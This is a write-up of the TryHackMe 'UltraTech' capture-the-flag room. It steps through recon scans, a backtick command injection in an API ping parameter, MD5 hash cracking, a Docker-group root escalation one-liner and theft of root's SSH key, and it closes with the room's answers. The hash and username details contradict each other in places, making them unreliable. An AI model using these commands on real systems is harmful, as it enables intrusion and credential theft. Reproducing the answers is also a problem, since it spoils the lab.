# Scanning
## Nmap
```
nmap -sC -sV -oN nmapInitial -T 5 [ip] -p-
```
- `-T 5` was specified to scan extremely aggressively since the prompts for flags hinted at non-standard ports being used, and a full port scan takes time. 

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-09-13 14:01 BST
Warning: ip giving up on port because retransmission cap hit (2).
Nmap scan report for ip-10-10-48-91.eu-west-1.compute.internal (ip)
Host is up (0.00034s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (EdDSA)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
MAC Address: 02:EA:A3:E6:A7:99 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.04 seconds
```

## Gobuster
### Port 31331
```
gobuster dir -u http://[ip]:31331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://ip:31331
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/13 14:14:13 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/server-status (Status: 403)
===============================================================
2023/09/13 14:14:35 Finished
===============================================================
```

#### Port 8081
```
gobuster dir -u http://[ip]:8081 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
#### Output
```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://ip:8081
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/13 14:44:04 Starting gobuster
===============================================================
/auth (Status: 200)
/Auth (Status: 200)
===============================================================
2023/09/13 14:44:31 Finished
===============================================================
```

## Nikto
### Port 31331
```
nikto -h http://[ip]:31331
```

```python
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          ip
+ Target Hostname:    ip-10-10-48-91.eu-west-1.compute.internal
+ Target Port:        31331
+ Start Time:         2023-09-13 14:54:13 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x17cc 0x584b2b811ebb3 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2023-09-13 14:54:22 (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Port 8081
```
nikto -h http://[ip]:8081
```

```python
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          ip
+ Target Hostname:    ip-10-10-48-91.eu-west-1.compute.internal
+ Target Port:        8081
+ Start Time:         2023-09-13 18:44:54 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/14 0xtVlBr0s73mf41Pi7C/1PMqiyXRc 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'access-control-allow-origin' found, with contents: *
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self'
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'access-control-allow-methods' found, with contents: GET,HEAD,PUT,PATCH,POST,DELETE
+ OSVDB-3092: /auth/: This might be interesting...
+ 6544 items checked: 24 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-09-13 18:45:05 (GMT1) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# Enumeration
## Web-based Services
- Visiting http{://}ip:8081. we are shown the following page:

![Ultratech API](https://github.com/APSUCyberClub/TryHackMe-Writeups/assets/156336307/ac902e1a-facf-4d15-ad01-c721cd6e00b4)



- Visiting http{://}ip:31331, we get the following landing page:

![Ultratech Website](https://github.com/APSUCyberClub/TryHackMe-Writeups/assets/156336307/22906cb0-bf12-48c7-8e91-de69d5d2d635)



- This appears to be a website hosted on the non-standard port 31331, running on an Apache webserver using Node.js.

### Gobuster
- Gobuster has provided information regarding possible directories, including `/js` and `/javascript`.
	- Visiting `/javascript` returns a 403 forbidden page. 
	- However, navigating to the `/js` directory displays the following:

![js Directory](https://github.com/APSUCyberClub/TryHackMe-Writeups/assets/156336307/41b4849d-82f8-4edc-904b-7920f292088e)



- Gobuster also found an `/auth` directory on port 8081, but when visited, it shows a basic static page stating a username and password is required.

### Nikto
- Nikto referenced a `/robots.txt` file that was available. When visited, the following was displayed:
```js
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

- When visiting the `/utech_sitemap.txt` directory, we were shown the following:
```js
/
/index.html
/what.html
/partners.html
```

- We have visited the `/index.html` page, which is just the basic landing page on port 31331. We have also seen the `/what.html` page, which can be referenced in more detail in the Rabbit Holes section. However, the `partners.html` web paged hasn't been seen before. When visited, we are greeted with the following login page:

![Partners Webpage](https://github.com/APSUCyberClub/TryHackMe-Writeups/assets/156336307/7bd823da-87ff-40a6-bb98-b4669a4071f9)



## Burp Suite
### Enumerating API with Burp Suite
- I did light research into API enumeration with Burp Suite, and you can navigate to the Target section of the project and expand the `http://ip:8081` file, and you can see that there are two APIs set, named `auth` and `ping`. The use of `ping` suggests that command injection may be possible. You can find the article I reference [here](https://portswigger.net/support/using-burp-to-enumerate-a-rest-api).
- Grabbing a web request through Burp Suite and sending it to Repeater is a good next step. You can navigate to the web page `/ping?ip=[ip]` and capture a web request. From there, you can send it to repeater and do some manual fuzzing in the `ping?ip=` field. I first started by pinging the IP address of the device I was working from, which worked fine.
- You can get command injection by wrapping a command in backticks. For example, you could enter `/ping?ip=[backtick] ls [backtick]` to run the `ls` command on the backend server. Submitting that as a `GET` request will return the following:

![Command Injection Through Burp 1](https://github.com/APSUCyberClub/TryHackMe-Writeups/assets/156336307/1d992a5e-8d63-429f-bf77-c84c62ceaec7)



- This gives us the name of a sqlite database: `utech.bd.sqlite`.
- Visiting `http://[ip]:8081/ping?ip=[backtick] cat utech.db.sqlite [backtick]` will show the following information through the browser:

![Cat UtechDBSQLite](https://github.com/APSUCyberClub/TryHackMe-Writeups/assets/156336307/0916992f-6d88-479f-9046-ac71100d3da0)



- This looks like a password hash for a user `r00t` and/or `admin`. 

## FTP Enumeration
- Anonymous FTP access is not enabled.
- We can log in with the cracked hash for the `r00t` user specified below, but there doesn't seem to be anything to pull down. Probably a red herring. 
- The `admin` user cannot access the FTP server with the credentials we obtained. 

# System Hacking
## Cracking Hashes
- r00t user hash: f357a0c52799563c7c7b76c1e7543a32
	- This is an MD5 hash. Tools like John The Ripper, Hashcat, or Crackstation can be used. 
	- Cracked hash: **n100906**
- admin user hash: f357a0c52799563c7c7b76c1e7543a32
	- Cracked hash: **mrsheafy**

# Privilege Escalation
- We can SSH into the target using the following syntax:
```bash
ssh root@[ip]
Password: n100906
```

- Once authenticated, we can begin some internal enumeration. I typically begin by running `sudo -l` to see if the `r00t` user has any sudo permissions that can be exploited. Following that, I bounced around a few directories looking for anything of note. Did some other basic enumeration like looking at the `/etc/passwd` file to see if there were other users to enumerate.
- I tried to SSH into the machine as the `admin` user, but it didn't work. It wouldn't authenticate to the FTP server either, so I check to see if it would work with the `/partners.html` login page. It did, but I was greeted with a page that contained a note talking about server misconfigurations. Since we already knew that there were likely Privilege Escalation vectors, this didn't help much.

- Running the `id` command as the `r00t` user gave us the following output:
```bash
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

- It looks like the `r00t` user is a member of the `docker` group on the machine. It might be worth checking out GTFOBins and see if there are any ways to abuse that to spawn a root shell.
- The following syntax from GTFOBins provides us with a root shell as a member of the `docker` group:
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- ***Note: There is no Alpine image on the machine, therefore the syntax will have to change!***

- The following syntax will show what docker image is running on the device, which will allow us to edit the above command to correctly gain root privileges:
```
docker ps -a
```
***Note: This shows all running docker processes.***

- The output is as follows:
```bash
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                     PORTS               NAMES
7beaaeecd784        bash                "docker-entrypoint.s\u2026"   4 years ago         Exited (130) 4 years ago                       unruffled_shockley
696fb9b45ae5        bash                "docker-entrypoint.s\u2026"   4 years ago         Exited (127) 4 years ago                       boring_varahamihira
9811859c4c5c        bash                "docker-entrypoint.s\u2026"   4 years ago         Exited (127) 4 years ago                       boring_volhard
```

- As we can see above, the machine is using a bash image. Therefore, the correct command to spawn a root shell would be:
```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

- Once we have root privileges, we can navigate to the `/root/.ssh` directory and use `cat id_rsa` to grab the private key for root. 

## Rabbit Holes
### Brute Forcing SSH Credentials with Hydra
- I had a hunch that the team specified on the landing page put what was likely to be their username to login to the partner portal. With that, I tried to use Hydra to use each of those usernames with a common credentials wordlist to brute force SSH and FTP. I attempted the usernames of `r00t` and `John`, since those are the username and name of the developer specified on the webpage respectively. 

### Sniper with Burp Suite
- I tried to use Sniper through Burp Suite once I found the `/partners.html` page by specifying `ultratech` as the username and selecting a long wordlist for passwords, but Burp Suite is so rate limited that it wasn't worth waiting for. I decided to do a little more looking instead, and found the two API routes. 

### Potential Username in Source Code
- After viewing the page source, we can see that there is a potential username to be used for authentication:

![Potential Email for Authentication 1](https://github.com/APSUCyberClub/TryHackMe-Writeups/assets/156336307/18208518-5be0-48f9-8f49-2c5c1b9cced0)



- This didn't turn out to be anything relevant. 

## THM Guided Questions and Answers
### It's Enumeration Time!
1. Which software is using the port 8081?
	1. Node.js
2. Which other non-standard port is used?
	1. 31331
3. Which software is using this port?
	1. Apache
4. Which GNU/Linux distribution seems to be used?
	1. Ubuntu
5. The software using the port 8081 is a REST API. How many of its routes are used by the web application?
	1. 2

### Let the Fun Begin
1. There is a database lying around. What is its filename?
	1. utech.db.sqlite
2. What is the first user's password hash?
	1. f357a0c52799563c7c7b76c1e7543a32
3. What is the password associated with this hash?
	1. n100906

### The Root of All Evil
1. What are the first 9 characters of the root user's private SSH key?
	1. MIIEogIBA


[Ultratech THM Room](https://tryhackme.com/room/ultratech1)
